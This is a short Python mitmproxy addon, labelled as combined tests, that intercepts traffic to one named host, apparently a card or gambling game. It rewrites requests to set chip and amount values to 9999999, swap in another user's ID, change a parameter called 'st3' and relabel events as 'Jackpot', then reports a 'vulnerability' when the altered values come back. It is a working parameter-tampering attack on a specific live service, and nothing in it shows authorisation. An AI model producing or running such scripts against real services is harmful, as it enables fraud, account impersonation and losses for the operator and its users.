# combined_test.py - Run all tests together
from mitmproxy import http
import random
import time
from datetime import datetime

class AllTests:
    def __init__(self):
        self.test_count = 0
        self.results = []
        
    def log(self, test_name, status, details=""):
        self.test_count += 1
        result = {
            "test": test_name,
            "status": status,
            "details": details,
            "time": datetime.now().isoformat()
        }
        self.results.append(result)
        print(f"[TEST #{self.test_count}] {test_name}: {status} - {details}")

tester = AllTests()

def request(flow: http.HTTPFlow) -> None:
    if "w.3pati.in" not in flow.request.pretty_host:
        return
    
    # TEST 1: Modify st3
    if "st3=" in flow.request.url:
        original = flow.request.query.get("st3", "")
        flow.request.query["st3"] = "9999999"
        tester.log("st3_modification", "MODIFIED", f"Changed {original} -> 9999999")
    
    # TEST 2: Change UID
    if "uid=" in flow.request.url:
        original = flow.request.query.get("uid", "")
        flow.request.query["uid"] = "12345678"
        tester.log("uid_manipulation", "MODIFIED", f"Changed {original} -> 12345678")
    
    # TEST 3: Add extra parameters
    flow.request.query["chips"] = "9999999"
    flow.request.query["amount"] = "9999999"
    tester.log("extra_params", "ADDED", "Added chips=9999999, amount=9999999")
    
    # TEST 4: Try different event names
    if "n=" in flow.request.url:
        flow.request.query["n"] = "Jackpot"
        tester.log("event_manipulation", "MODIFIED", "Changed event to Jackpot")

def response(flow: http.HTTPFlow) -> None:
    if "w.3pati.in" in flow.request.pretty_host:
        status = flow.response.status_code
        tester.log("response_check", f"STATUS {status}", 
                   f"Modified request returned {status}")
        
        # Check if any modifications worked
        if flow.response.text:
            for test in ["9999999", "12345678", "Jackpot"]:
                if test in flow.response.text:
                    print(f"  🔴 VULNERABILITY FOUND! Server returned {test} in response!")